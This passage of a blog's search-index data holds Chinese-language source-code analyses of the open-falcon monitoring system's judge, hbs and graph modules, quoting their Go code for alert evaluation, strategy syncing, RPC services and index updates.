{\n\t\tproc.HttpRecvCnt.IncrBy(cnt)\n\t}\n\n\tcfg := g.Config()\n\n    //   打到对应的缓存队列中去。\n\tif cfg.Graph.Enabled {\n\t\tsender.Push2GraphSendQueue(items)\n\t}\n\n\tif cfg.Judge.Enabled {\n\t\tsender.Push2JudgeSendQueue(items)\n\t}\n\n\tif cfg.Tsdb.Enabled {\n\t\tsender.Push2TsdbSendQueue(items)\n\t}\n\n\treply.Message = \"ok\"\n\treply.Total = len(args)\n\treply.Latency = (time.Now().UnixNano() - start.UnixNano()) / 1000000\n\n\treturn nil\n}\n```\n\n函数push2GraphSendQueue函数：\n\n```go\n// 将数据 打入 某个Graph的发送缓存队列, 具体是哪一个Graph 由一致性哈希 决定\nfunc Push2GraphSendQueue(items []*cmodel.MetaData) {\n\tcfg := g.Config().Graph\n\n\tfor _, item := range items {\n        // 转换数据\n\t\tgraphItem, err := convert2GraphItem(item)\n\t\tif err != nil {\n\t\t\tlog.Println(\"E:\", err)\n\t\t\tcontinue\n\t\t}\n\t\tpk := item.PK()\n\n\t\t// statistics. 为了效率,放到了这里,因此只有graph是enbale时才能trace\n\t\tproc.RecvDataTrace.Trace(pk, item)\n\t\tproc.RecvDataFilter.Filter(pk, item.Value, item)\n\t\t// 得到对应的一致性hash分片节点\n\t\tnode, err := GraphNodeRing.GetNode(pk)\n\t\tif err != nil {\n\t\t\tlog.Println(\"E:\", err)\n\t\t\tcontinue\n\t\t}\n\n\t\tcnode := cfg.ClusterList[node]\n\t\terrCnt := 0\n\t\tfor _, addr := range cnode.Addrs {\n\t\t\tQ := GraphQueues[node+addr]\n             // 获取队列并推送到缓存队列中去\n\t\t\tif !Q.PushFront(graphItem) {\n\t\t\t\terrCnt += 1\n\t\t\t}\n\t\t}\n\n\t\t// statistics\n\t\tif errCnt > 0 {\n\t\t\tproc.SendToGraphDropCnt.Incr()\n\t\t}\n\t}\n}\n```\n\n其他两个函数基本类似，都是使用这种方式来将数据推送的内存队列中，然后使用send task 任务发送出去。队列不会堆积，因为发送的时候会出队，不过这样如果发送三次还是失败，这个数据就丢失了。。只能通过统计数据来定位了。\n\n\n\n\n\n","tags":["monitor"],"categories":["monitor"]},{"title":"open-falcon judge 源码分析","url":"/2020/01/21/judge源码分析/","content":"## open-falcon judge源码分析\n\njudge模块主要流程在modules/judge/main\n\n```go\nfunc main() {\n\tg.BinaryName = BinaryName\n\tg.Version = Version\n\tg.GitCommit = GitCommit\n\n\tcfg := flag.String(\"c\", \"cfg.json\", \"configuration file\")\n\tversion := flag.Bool(\"v\", false, \"show version\")\n\tflag.Parse()\n\n\tif *version {\n\t\tfmt.Printf(\"Open-Falcon %s version %s, build %s\\n\", BinaryName, Version, GitCommit)\n\t\tos.Exit(0)\n\t}\n\t//解析配置文件\n\tg.ParseConfig(*cfg)\n\t// 初始化数据库连接池\n\tg.InitRedisConnPool()\n    // 初始化HBS客户端\n\tg.InitHbsClient()\n\t//初始化存储，初始化内存BigMap，存储采集历史数据\n\tstore.InitHistoryBigMap()\n\t//http服务启动\n\tgo http.Start()\n    // rpc服务启动\n\tgo rpc.Start()\n\t//定时从HBS同步策略\n\tgo cron.SyncStrategies()\n    //清理无效数据\n\tgo cron.CleanStale()\n\n\tselect {}\n}\n```\n\nhttp服务接口数据，注册route:\n\n```go\nfunc init() {\n\tconfigCommonRoutes()\n\tconfigInfoRoutes()\n}\n```\n\n再看下rpc接口，judge主要有Send函数来做：\n\n```go\nfunc (this *Judge) Send(items []*model.JudgeItem, resp *model.SimpleRpcResponse) error {\n\tremain := g.Config().Remain\n\t// 把当前时间的计算放在最外层，是为了减少获取时间时的系统调用开销\n\tnow := time.Now().Unix()\n\tfor _, item := range items {\n\t\texists := g.FilterMap.Exists(item.Metric)\n\t\tif !exists {\n\t\t\tcontinue\n\t\t}\n\t\tpk := item.PrimaryKey()\n        // 接收数据，将数据放到bigMap中去\n\t\tstore.HistoryBigMap[pk[0:2]].PushFrontAndMaintain(pk, item, remain, now)\n\t}\n\treturn nil\n}\n```\n\n函数推送\n\n```go\n\nfunc (this *JudgeItemMap) PushFrontAndMaintain(key string, val *model.JudgeItem, maxCount int, now int64) {\n    // 如果这个keys存在了则压入队列，如果不存在放入队列之后调用judge函数判断\n\tif linkedList, exists := this.Get(key); exists {\n\t\tneedJudge := linkedList.PushFrontAndMaintain(val, maxCount)\n\t\tif needJudge {\n\t\t\tJudge(linkedList, val, now)\n\t\t}\n\t} else {\n\t\tNL := list.New()\n\t\tNL.PushFront(val)\n\t\tsafeList := &SafeLinkedList{L: NL}\n\t\tthis.Set(key, safeList)\n\t\tJudge(safeList, val, now)\n\t}\n}\n```\n\n检查Strategy和expression:\n\n```go\nfunc Judge(L *SafeLinkedList, firstItem *model.JudgeItem, now int64) {\n\tCheckStrategy(L, firstItem, now)\n\tCheckExpression(L, firstItem, now)\n}\n```\n\n```go\nfunc CheckStrategy(L *SafeLinkedList, firstItem *model.JudgeItem, now int64) {\n\tkey := fmt.Sprintf(\"%s/%s\", firstItem.Endpoint, firstItem.Metric)\n\tstrategyMap := g.StrategyMap.Get()\n\tstrategies, exists := strategyMap[key]\n\tif !exists {\n\t\treturn\n\t}\n\n\tfor _, s := range strategies {\n\t\t// 因为key仅仅是endpoint和metric，所以得到的strategies并不一定是与当前judgeItem相关的\n\t\t// 比如lg-dinp-docker01.bj配置了两个proc.num的策略，一个name=docker，一个name=agent\n\t\t// 所以此处要排除掉一部分\n\t\trelated := true\n\t\tfor tagKey, tagVal := range s.Tags {\n\t\t\tif myVal, exists := firstItem.Tags[tagKey]; !exists || myVal != tagVal {\n\t\t\t\trelated = false\n\t\t\t\tbreak\n\t\t\t}\n\t\t}\n\t\t// 查找到相关的指标，然后judge对应的策略\n\t\tif !related {\n\t\t\tcontinue\n\t\t}\n\n\t\tjudgeItemWithStrategy(L, s, firstItem, now)\n\t}\n}\n```\n\njudgeItemWithStrategy函数寻找相应的策略：\n\n```go\nfunc judgeItemWithStrategy(L *SafeLinkedList, strategy model.Strategy, firstItem *model.JudgeItem, now int64) {\n\tfn, err := ParseFuncFromString(strategy.Func, strategy.Operator, strategy.RightValue)\n\tif err != nil {\n\t\tlog.Printf(\"[ERROR] parse func %s fail: %v. strategy id: %d\", strategy.Func, err, strategy.Id)\n\t\treturn\n\t}\n\t//判断是否需要触发，如果满足条件，则发送事件\n\thistoryData, leftValue, isTriggered, isEnough := fn.Compute(L)\n\tif !isEnough {\n\t\treturn\n\t}\n\n\tevent := &model.Event{\n\t\tId:         fmt.Sprintf(\"s_%d_%s\", strategy.Id, firstItem.PrimaryKey()),\n\t\tStrategy:   &strategy,\n\t\tEndpoint:   firstItem.Endpoint,\n\t\tLeftValue:  leftValue,\n\t\tEventTime:  firstItem.Timestamp,\n\t\tPushedTags: firstItem.Tags,\n\t}\n\t// 发送事件\n\tsendEventIfNeed(historyData, isTriggered, now, event, strategy.MaxStep)\n}\n```\n\n```go\nfunc sendEventIfNeed(historyData []*model.HistoryData, isTriggered bool, now int64, event *model.Event, maxStep int) {\n\tlastEvent, exists := g.LastEvents.Get(event.Id)\n\tif isTriggered {\n\t\tevent.Status = \"PROBLEM\"\n\t\tif !exists || lastEvent.Status[0] == 'O' {\n\t\t\t// 本次触发了阈值，之前又没报过警，得产生一个报警Event\n\t\t\tevent.CurrentStep = 1\n\n\t\t\t// 但是有些用户把最大报警次数配置成了0，相当于屏蔽了，要检查一下\n\t\t\tif maxStep == 0 {\n\t\t\t\treturn\n\t\t\t}\n\n\t\t\tsendEvent(event)\n\t\t\treturn\n\t\t}\n\n\t\t// 逻辑走到这里，说明之前Event是PROBLEM状态\n\t\tif lastEvent.CurrentStep >= maxStep {\n\t\t\t// 报警次数已经足够多，到达了最多报警次数了，不再报警\n\t\t\treturn\n\t\t}\n\n\t\tif historyData[len(historyData)-1].Timestamp <= lastEvent.EventTime {\n\t\t\t// 产生过报警的点，就不能再使用来判断了，否则容易出现一分钟报一次的情况\n\t\t\t// 只需要拿最后一个historyData来做判断即可，因为它的时间最老\n\t\t\treturn\n\t\t}\n\n\t\tif now-lastEvent.EventTime < g.Config().Alarm.MinInterval {\n\t\t\t// 报警不能太频繁，两次报警之间至少要间隔MinInterval秒，否则就不能报警\n\t\t\treturn\n\t\t}\n\n\t\tevent.CurrentStep = lastEvent.CurrentStep + 1\n\t\tsendEvent(event) //发送事件，函数将报警事件存储到redis队列中去。\n\t} else {\n\t\t// 如果LastEvent是Problem，报OK，否则啥都不做\n\t\tif exists && lastEvent.Status[0] == 'P' {\n\t\t\tevent.Status = \"OK\"\n\t\t\tevent.CurrentStep = 1\n\t\t\tsendEvent(event)\n\t\t}\n\t}\n}\n```\n\n检查表达式是否满足要求：\n\n```go\nfunc CheckExpression(L *SafeLinkedList, firstItem *model.JudgeItem, now int64) {\n\tkeys := buildKeysFromMetricAndTags(firstItem)\n\tif len(keys) == 0 {\n\t\treturn\n\t}\n\n\t// expression可能会被多次重复处理，用此数据结构保证只被处理一次\n\thandledExpression := make(map[int]struct{})\n\n\texpressionMap := g.ExpressionMap.Get()\n\tfor _, key := range keys {\n\t\texpressions, exists := expressionMap[key]\n\t\tif !exists {\n\t\t\tcontinue\n\t\t}\n\t\t//过滤相关表达式\n\t\trelated := filterRelatedExpressions(expressions, firstItem)\n\t\tfor _, exp := range related {\n\t\t\tif _, ok := handledExpression[exp.Id]; ok {\n\t\t\t\tcontinue\n\t\t\t}\n\t\t\thandledExpression[exp.Id] = struct{}{}\n\t\t\tjudgeItemWithExpression(L, exp, firstItem, now)\n\t\t}\n\t}\n}\n```\n\n类似的满足要求发送事件给redis：\n\n```go\nfunc judgeItemWithExpression(L *SafeLinkedList, expression *model.Expression, firstItem *model.JudgeItem, now int64) {\n\tfn, err := ParseFuncFromString(expression.Func, expression.Operator, expression.RightValue)\n\tif err != nil {\n\t\tlog.Printf(\"[ERROR] parse func %s fail: %v. expression id: %d\", expression.Func, err, expression.Id)\n\t\treturn\n\t}\n\n\thistoryData, leftValue, isTriggered, isEnough := fn.Compute(L)\n\tif !isEnough {\n\t\treturn\n\t}\n\n\tevent := &model.Event{\n\t\tId:         fmt.Sprintf(\"e_%d_%s\", expression.Id, firstItem.PrimaryKey()),\n\t\tExpression: expression,\n\t\tEndpoint:   firstItem.Endpoint,\n\t\tLeftValue:  leftValue,\n\t\tEventTime:  firstItem.Timestamp,\n\t\tPushedTags: firstItem.Tags,\n\t}\n\n\tsendEventIfNeed(historyData, isTriggered, now, event, expression.MaxStep)\n\n}\n```\n\n其中使用fn.Compute使用的是离群点检测函数，更多请参考3-sigma算法，https://en.wikipedia.org/wiki/68%E2%80%9395%E2%80%9399.7_rule\nstddev(#10) = 3 //取最新 **10** 个点的数据分别计算得到他们的标准差和均值，分别计为 σ 和 μ，其中当前值计为 X，那么当 X 落在区间 [μ-3σ, μ+3σ] 之外时则报警。\n\n接下来SyncStrategies函数从HBS同步策略：\n\n```go\nfunc SyncStrategies() {\n\tduration := time.Duration(g.Config().Hbs.Interval) * time.Second\n\tfor {\n\t\tsyncStrategies()   //同步策略\n\t\tsyncExpression()   //同步表达式\n\t\tsyncFilter()       //同步过滤器\n\t\ttime.Sleep(duration)\n\t}\n}\n```\n\n```go\nfunc syncStrategies() {\n\tvar strategiesResponse model.StrategiesResponse\n\terr := g.HbsClient.Call(\"Hbs.GetStrategies\", model.NullRpcRequest{}, &strategiesResponse)  //调用HBS rpc接口数据数据\n\tif err != nil {\n\t\tlog.Println(\"[ERROR] Hbs.GetStrategies:\", err)\n\t\treturn\n\t}\n\n\trebuildStrategyMap(&strategiesResponse)  //重建策略数据结构\n}\n```\n\n```go\nfunc syncExpression() {\n\tvar expressionResponse model.ExpressionResponse\n\terr := g.HbsClient.Call(\"Hbs.GetExpressions\", model.NullRpcRequest{}, &expressionResponse)   //调用HBS接口返回数据\n\tif err != nil {\n\t\tlog.Println(\"[ERROR] Hbs.GetExpressions:\", err)\n\t\treturn\n\t}\n\n\trebuildExpressionMap(&expressionResponse)  // 重建表达式数据结构\n}\n```\n\n```go\nfunc syncFilter() {\n\tm := make(map[string]string)\n\n\t//M map[string][]model.Strategy\n\tstrategyMap := g.StrategyMap.Get()\n\tfor _, strategies := range strategyMap {\n\t\tfor _, strategy := range strategies {\n\t\t\tm[strategy.Metric] = strategy.Metric\n\t\t}\n\t}\n\n\t//M map[string][]*model.Expression\n\texpressionMap := g.ExpressionMap.Get()\n\tfor _, expressions := range expressionMap {\n\t\tfor _, expression := range expressions {\n\t\t\tm[expression.Metric] = expression.Metric\n\t\t}\n\t}\n\n\tg.FilterMap.ReInit(m)  // 设置获取到的map数据结构\n}\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["monitor"],"categories":["monitor"]},{"title":"open-falcon hbs 源码分析","url":"/2020/01/21/hbs源码分析/","content":"## open-falcon hbs源码分析\n\n本篇文章主要分析下open-falcon中hbs如何实现的：\n\n主流程再modules/hbs/main.go模块中：\n\n```go\nfunc main() {\n\tg.BinaryName = BinaryName\n\tg.Version = Version\n\tg.GitCommit = GitCommit\n\n\tcfg := flag.String(\"c\", \"cfg.json\", \"configuration file\")\n\tversion := flag.Bool(\"v\", false, \"show version\")\n\tflag.Parse()\n\n\tif *version {\n\t\tfmt.Printf(\"Open-Falcon %s version %s, build %s\\n\", BinaryName, Version, GitCommit)\n\t\tos.Exit(0)\n\t}\n\t// 解析配置文件\n\tg.ParseConfig(*cfg)\n\t// 初始化数据库，检查数据库是否可以连接，连接失败退出。\n\tdb.Init()\n    // 初始化缓存，从数据库中查询数据加载到缓存中。\n\tcache.Init()\n\t// 删除没有心跳的agent\n\tgo cache.DeleteStaleAgents()\n\t// 启动hbs http服务\n\tgo http.Start()\n    // 启动 rpc服务\n\tgo rpc.Start()\n\n    //信号量检查\n\tsigs := make(chan os.Signal, 1)\n\tsignal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)\n\tgo func() {\n\t\t<-sigs\n\t\tfmt.Println()\n\t\tdb.DB.Close()\n\t\tos.Exit(0)\n\t}()\n\n\tselect {}\n}\n```\n\ndb初始化函数Init:\n\n```go\nfunc Init() {\n\tvar err error\n\tDB, err = sql.Open(\"mysql\", g.Config().Database)\n\tif err != nil {\n\t\tlog.Fatalln(\"open db fail:\", err)\n\t}\n\n\tDB.SetMaxOpenConns(g.Config().MaxConns)\n\tDB.SetMaxIdleConns(g.Config().MaxIdle)\n\n\terr = DB.Ping()\n\tif err != nil {\n\t\tlog.Fatalln(\"ping db fail:\", err)\n\t}\n}\n```\n\n初始化缓存数据：\n\n```go\nfunc Init() {\n\tlog.Println(\"cache begin\")\n\t// 查询group与plugins的关系到缓存中\n\tlog.Println(\"#1 GroupPlugins...\")\n\tGroupPlugins.Init()\n\t// 查询group与template的关系到缓存中\n\tlog.Println(\"#2 GroupTemplates...\")\n\tGroupTemplates.Init()\n\t// 查询host与group的关系到缓存中\n\tlog.Println(\"#3 HostGroupsMap...\")\n\tHostGroupsMap.Init()\n\t//查询所有的host信息到缓存，方便查询hostname->id\n\tlog.Println(\"#4 HostMap...\")\n\tHostMap.Init()\n\t//查询所有的template信息到缓存中\n\tlog.Println(\"#5 TemplateCache...\")\n\tTemplateCache.Init()\n\t//查询对应模块的策略信息到缓存中\n\tlog.Println(\"#6 Strategies...\")\n\tStrategies.Init(TemplateCache.GetMap())\n\t//查询host与template的缓存信息，一个id对应多个模块ID\n\tlog.Println(\"#7 HostTemplateIds...\")\n\tHostTemplateIds.Init()\n\t//查询所有表达式到缓存中\n\tlog.Println(\"#8 ExpressionCache...\")\n\tExpressionCache.Init()\n\t// 查询被监控的host信息缓存\n\tlog.Println(\"#9 MonitoredHosts...\")\n\tMonitoredHosts.Init()\n\n\tlog.Println(\"cache done\")\n\t\n\tgo LoopInit() //定时查询更新，比较消耗资源。\n\n}\n```\n\n定时检查当前agents列表中的信息心跳最后更新时间：\n\n```go\nfunc deleteStaleAgents() {\n\t// 一天都没有心跳的Agent，从内存中干掉\n\tbefore := time.Now().Unix() - 3600*24\n\tkeys := Agents.Keys()\n\tcount := len(keys)\n\tif count == 0 {\n\t\treturn\n\t}\n\n\tfor i := 0; i < count; i++ {\n\t\tcurr, _ := Agents.Get(keys[i])\n\t\tif curr.LastUpdate < before {\n\t\t\tAgents.Delete(curr.ReportRequest.Hostname)\n\t\t}\n\t}\n}\n```\n\nhttp服务初始化：\n\n```go\n//init函数\nfunc init() {\n\tconfigCommonRoutes()  //注册通用api\n\tconfigProcRoutes()    //注册获取策略等信息\n}\n```\n\nrpc接口初始化：\n\n```go\nfunc Start() {\n\taddr := g.Config().Listen\n\n\tserver := rpc.NewServer()\n\t// server.Register(new(filter.Filter))\n\tserver.Register(new(Agent))\n\tserver.Register(new(Hbs))\n\n\tl, e := net.Listen(\"tcp\", addr)\n\tif e != nil {\n\t\tlog.Fatalln(\"listen error:\", e)\n\t} else {\n\t\tlog.Println(\"listening\", addr)\n\t}\n\n\tfor {\n\t\tconn, err := l.Accept()\n\t\tif err != nil {\n\t\t\tlog.Println(\"listener accept fail:\", err)\n\t\t\ttime.Sleep(time.Duration(100) * time.Millisecond)\n\t\t\tcontinue\n\t\t}\n\t\tgo server.ServeCodec(jsonrpc.NewServerCodec(conn))\n\t}\n}\n```\n\n基本流程分析完毕，我们主要来看下hbs提供出来的rpc函数有那些：\n\nagent rpc接口：\n\n```go\nMinePlugin函数主要从缓存中查询plugins插件列表\nReportStatus获取到agent来的状态数据，更新缓存中的数据\nTrustableIps白名单，从配置文件中读取\nBuiltinMetrics，agent按照server端的配置，按需采集的metric\n```\n\nhbs rpc接口：\n\n```go\nGetExpressions 获取查询表达式\nGetStrategies 获取strategy策略，用于judge调用\n```\n\n我们来看下这个函数GetStrategies，这个函数主要用于给judge定时更新策略的。\n\n```go\nfunc (t *Hbs) GetStrategies(req model.NullRpcRequest, reply *model.StrategiesResponse) error {\n\treply.HostStrategies = []*model.HostStrategy{}\n\t// 一个机器ID对应多个模板ID\n\thidTids := cache.HostTemplateIds.GetMap()\n\tsz := len(hidTids)\n\tif sz == 0 {\n\t\treturn nil\n\t}\n\n\t// Judge需要的是hostname，此处要把HostId转换为hostname\n\t// 查出的hosts，是不处于维护时间内的\n\thosts := cache.MonitoredHosts.Get()\n\tif len(hosts) == 0 {\n\t\t// 所有机器都处于维护状态，汗\n\t\treturn nil\n\t}\n\t// 查询所有模板信息\n\ttpls := cache.TemplateCache.GetMap()\n\tif len(tpls) == 0 {\n\t\treturn nil\n\t}\n\t//查询所有策略信息\n\tstrategies := cache.Strategies.GetMap()\n\tif len(strategies) == 0 {\n\t\treturn nil\n\t}\n\n\t// 做个索引，给一个tplId，可以很方便的找到对应了哪些Strategy\n\ttpl2Strategies := Tpl2Strategies(strategies)\n\n\thostStrategies := make([]*model.HostStrategy, 0, sz)\n\tfor hostId, tplIds := range hidTids {\n\n\t\th, exists := hosts[hostId]\n\t\tif !exists {\n\t\t\tcontinue\n\t\t}\n\n\t\t// 计算当前host配置了哪些监控策略\n\t\tss := CalcInheritStrategies(tpls, tplIds, tpl2Strategies)\n\t\tif len(ss) <= 0 {\n\t\t\tcontinue\n\t\t}\n\n\t\ths := model.HostStrategy{\n\t\t\tHostname:   h.Name,\n\t\t\tStrategies: ss,\n\t\t}\n\n\t\thostStrategies = append(hostStrategies, &hs)\n\n\t}\n\n\treply.HostStrategies = hostStrategies\n\treturn nil\n}\n```\n\nTpl2Strategies函数根据strategies查询所有模板信息：\n\n```go\nfunc Tpl2Strategies(strategies map[int]*model.Strategy) map[int][]*model.Strategy {\n\tret := make(map[int][]*model.Strategy)\n\tfor _, s := range strategies {\n\t\tif s == nil || s.Tpl == nil {\n\t\t\tcontinue\n\t\t}\n\t\tif _, exists := ret[s.Tpl.Id]; exists {\n\t\t\tret[s.Tpl.Id] = append(ret[s.Tpl.Id], s)\n\t\t} else {\n\t\t\tret[s.Tpl.Id] = []*model.Strategy{s}\n\t\t}\n\t}\n\treturn ret\n}\n```\n\nCalcInheritStrategies函数用于计算当前host机器有多少策略：\n\n```go\nfunc CalcInheritStrategies(allTpls map[int]*model.Template, tids []int, tpl2Strategies map[int][]*model.Strategy) []model.Strategy {\n\t// 根据模板的继承关系，找到每个机器对应的模板全量\n\t/**\n\t * host_id =>\n\t * |a |d |a |a |a |\n\t * |  |  |b |b |f |\n\t * |  |  |  |c |  |\n\t * |  |  |  |  |  |\n\t */\n\ttpl_buckets := [][]int{}\n\tfor _, tid := range tids {\n        // 查找所有id的parentid\n\t\tids := cache.ParentIds(allTpls, tid)\n\t\tif len(ids) <= 0 {\n\t\t\tcontinue\n\t\t}\n\t\ttpl_buckets = append(tpl_buckets, ids)\n\t}\n\n\t// 每个host 关联的模板，有继承关系的放到同一个bucket中，其他的放在各自单独的bucket中\n\t/**\n\t * host_id =>\n\t * |a |d |a |\n\t * |b |  |f |\n\t * |c |  |  |\n\t * |  |  |  |\n\t */\n\tcount := len(tpl_buckets)\n\tuniq_tpl_buckets := [][]int{}\n\tfor i := 0; i < count; i++ {\n\t\tvar valid bool = true\n\t\tfor j := 0; j < count; j++ {\n\t\t\tif i == j {\n\t\t\t\tcontinue\n\t\t\t}\n\t\t\tif slice_int_eq(tpl_buckets[i], tpl_buckets[j]) {\n\t\t\t\tbreak\n\t\t\t}\n\t\t\tif slice_int_lt(tpl_buckets[i], tpl_buckets[j]) {\n\t\t\t\tvalid = false\n\t\t\t\tbreak\n\t\t\t}\n\t\t}\n\t\tif valid {\n\t\t\tuniq_tpl_buckets = append(uniq_tpl_buckets, tpl_buckets[i])\n\t\t}\n\t}\n\n\t// 继承覆盖父模板策略，得到每个模板聚合后的策略列表\n\tstrategies := []model.Strategy{}\n\n\texists_by_id := make(map[int]struct{})\n\tfor _, bucket := range uniq_tpl_buckets {\n\n\t\t// 开始计算一个桶，先计算老的tid，再计算新的，所以可以覆盖\n\t\t// 该桶最终结果\n\t\tbucket_stras_map := make(map[string][]*model.Strategy)\n\t\tfor _, tid := range bucket {\n\n\t\t\t// 一个tid对应的策略列表\n\t\t\tthe_tid_stras := make(map[string][]*model.Strategy)\n\n\t\t\tif stras, ok := tpl2Strategies[tid]; ok {\n\t\t\t\tfor _, s := range stras {\n\t\t\t\t\tuuid := fmt.Sprintf(\"metric:%s/tags:%v\", s.Metric, utils.SortedTags(s.Tags))\n\t\t\t\t\tif _, ok2 := the_tid_stras[uuid]; ok2 {\n\t\t\t\t\t\tthe_tid_stras[uuid] = append(the_tid_stras[uuid], s)\n\t\t\t\t\t} else {\n\t\t\t\t\t\tthe_tid_stras[uuid] = []*model.Strategy{s}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\t\t\t// 覆盖父模板\n\t\t\tfor uuid, ss := range the_tid_stras {\n\t\t\t\tbucket_stras_map[uuid] = ss\n\t\t\t}\n\t\t}\n\n\t\tlast_tid := bucket[len(bucket)-1]\n\n\t\t// 替换所有策略的模板为最年轻的模板\n\t\tfor _, ss := range bucket_stras_map {\n\t\t\tfor _, s := range ss {\n\t\t\t\tvalStrategy := *s\n\t\t\t\t// exists_by_id[s.Id] 是根据策略ID去重，不太确定是否真的需要，不过加上肯定没问题\n\t\t\t\tif _, exist := exists_by_id[valStrategy.Id]; !exist {\n\t\t\t\t\tif valStrategy.Tpl.Id != last_tid {\n\t\t\t\t\t\tvalStrategy.Tpl = allTpls[last_tid]\n\t\t\t\t\t}\n\t\t\t\t\tstrategies = append(strategies, valStrategy)\n\t\t\t\t\texists_by_id[valStrategy.Id] = struct{}{}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\n\treturn strategies\n}\n```\n\nhbs中主要的功能分析完毕。相应的需要结合judge和agent来看各个rpc接口调用关系了。\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["monitor"],"categories":["monitor"]},{"title":"open-falcon graph 源码分析","url":"/2020/01/21/graph源码分析/","content":"## open-falcon graph源码分析\n\ngraph主流程在modules/graph/main中：\n\n```go\nfunc main() {\n\tg.BinaryName = BinaryName\n\tg.Version = Version\n\tg.GitCommit = GitCommit\n\n\tcfg := flag.String(\"c\", \"cfg.json\", \"specify config file\")\n\tversion := flag.Bool(\"v\", false, \"show version\")\n\tversionGit := flag.Bool(\"vg\", false, \"show version and git commit log\")\n\tflag.Parse()\n\n\tif *version {\n\t\tfmt.Printf(\"Open-Falcon %s version %s, build %s\\n\", BinaryName, Version, GitCommit)\n\t\tos.Exit(0)\n\t}\n\tif *versionGit {\n\t\tfmt.Printf(\"Open-Falcon %s version %s, build %s\\n\", BinaryName, Version, GitCommit)\n\t\tos.Exit(0)\n\t}\n\n\t// global config\n    // 解析配置文件\n\tg.ParseConfig(*cfg)\n\n\tif g.Config().Debug {\n\t\tg.InitLog(\"debug\")\n\t} else {\n\t\tg.InitLog(\"info\")\n\t}\n\n\t// init db\n    // 初始化数据库，连接不上失败\n\tg.InitDB()\n\t// rrdtool init\n    // rrd初始化\n\trrdtool.InitChannel()\n\t// rrdtool before api for disable loopback connection\n\trrdtool.Start()\n\t// start api\n\tgo api.Start()\n\t// start indexing\n    // index更新，定期刷新数据到数据库中\n\tindex.Start()\n\t// start http server\n\tgo http.Start()\n    // 定时清理无效数据\n\tgo cron.CleanCache()\n\n\tstart_signal(os.Getpid(), g.Config())\n}\n```\n\nrrdtool启动，启动协程定时写磁盘数据\n\n```go\nfunc Start() {\n\tcfg := g.Config()\n\tvar err error\n\t// check data dir\n\tif err = file.EnsureDirRW(cfg.RRD.Storage); err != nil {\n\t\tlog.Fatalln(\"rrdtool.Start error, bad data dir \"+cfg.RRD.Storage+\",\", err)\n\t}\n\t\n\tmigrate_start(cfg)\n\n\t// sync disk\n    // 写入rdd数据\n\tgo syncDisk()\n    // task不同任务刷新\n\tgo ioWorker()\n\tlog.Println(\"rrdtool.Start ok\")\n}\n```\n\napi模块启动\n\n```go\nfunc Start() {\n\tif !g.Config().Rpc.Enabled {\n\t\tlog.Println(\"rpc.Start warning, not enabled\")\n\t\treturn\n\t}\n\taddr := g.Config().Rpc.Listen\n\ttcpAddr, err := net.ResolveTCPAddr(\"tcp\", addr)\n\tif err != nil {\n\t\tlog.Fatalf(\"rpc.Start error, net.ResolveTCPAddr failed, %s\", err)\n\t}\n\n\tlistener, err := net.ListenTCP(\"tcp\", tcpAddr)\n\tif err != nil {\n\t\tlog.Fatalf(\"rpc.Start error, listen %s failed, %s\", addr, err)\n\t} else {\n\t\tlog.Println(\"rpc.Start ok, listening on\", addr)\n\t}\n\n\trpc.Register(new(Graph))  // rpc接口注册\n\n\tgo func() {\n\t\tvar tempDelay time.Duration // how long to sleep on accept failure\n\t\tfor {\n\t\t\tconn, err := listener.Accept()\n\t\t\tif err != nil {\n\t\t\t\tif tempDelay == 0 {\n\t\t\t\t\ttempDelay = 5 * time.Millisecond\n\t\t\t\t} else {\n\t\t\t\t\ttempDelay *= 2\n\t\t\t\t}\n\t\t\t\tif max := 1 * time.Second; tempDelay > max {\n\t\t\t\t\ttempDelay = max\n\t\t\t\t}\n\t\t\t\ttime.Sleep(tempDelay)\n\t\t\t\tcontinue\n\t\t\t}\n\t\t\ttempDelay = 0\n\t\t\tgo func() {\n\t\t\t\te := connects.insert(conn)\n\t\t\t\tdefer connects.remove(e)\n\t\t\t\trpc.ServeConn(conn)\n\t\t\t}()\n\t\t}\n\t}()\n\n\tselect {\n\tcase <-Close_chan:\n\t\tlog.Println(\"rpc, recv sigout and exiting...\")\n\t\tlistener.Close()\n\t\tClose_done_chan <- 1\n\n\t\tconnects.Lock()\n\t\tfor e := connects.list.Front(); e != nil; e = e.Next() {\n\t\t\te.Value.(net.Conn).Close()\n\t\t}\n\t\tconnects.Unlock()\n\n\t\treturn\n\t}\n\n}\n```\n\n接下来初始化内存索引信息：\n\n```go\nfunc Start() {\n\tInitCache()   //初始化缓存cache统计信息\n\tgo StartIndexUpdateIncrTask()   //更新索引任务\n\tlog.Debug(\"index.Start ok\")\n}\n```\n\n```go\n// 启动索引的 异步、增量更新 任务, 每隔一定时间，刷新cache中的数据到数据库中\nfunc StartIndexUpdateIncrTask() {\n\tfor {\n\t\ttime.Sleep(IndexUpdateIncrTaskSleepInterval)\n\t\tstartTs := time.Now().Unix()\n\t\tcnt := updateIndexIncr()\n\t\tendTs := time.Now().Unix()\n\t\t// statistics\n\t\tproc.IndexUpdateIncrCnt.SetCnt(int64(cnt))\n\t\tproc.IndexUpdateIncr.Incr()\n\t\tproc.IndexUpdateIncr.PutOther(\"lastStartTs\", ntime.FormatTs(startTs))\n\t\tproc.IndexUpdateIncr.PutOther(\"lastTimeConsumingInSec\", endTs-startTs)\n\t}\n}\n```\n\n主要针对一些收集到的指标数据更新到数据库中。方便后续查询和报警使用：\n\n```go\n// 进行一次增量更新\nfunc updateIndexIncr() int {\n\tret := 0\n\tif unIndexedItemCache == nil || unIndexedItemCache.Size() <= 0 {\n\t\treturn ret\n\t}\n\n\tdbConn, err := g.GetDbConn(\"UpdateIndexIncrTask\")\n\tif err != nil {\n\t\tlog.Error(\"[ERROR] get dbConn fail\", err)\n\t\treturn ret\n\t}\n\n\tkeys := unIndexedItemCache.Keys()\n\tfor _, key := range keys {\n\t\ticitem := unIndexedItemCache.Get(key)\n\t\tunIndexedItemCache.Remove(key)\n\t\tif icitem != nil {\n\t\t\t// 并发更新mysql\n\t\t\tsemaUpdateIndexIncr.Acquire()\n\t\t\tgo func(key string, icitem *IndexCacheItem, dbConn *sql.DB) {\n\t\t\t\tdefer semaUpdateIndexIncr.Release()\n\t\t\t\terr := updateIndexFromOneItem(icitem.Item, dbConn)  // 更新数据到数据库\n\t\t\t\tif err != nil 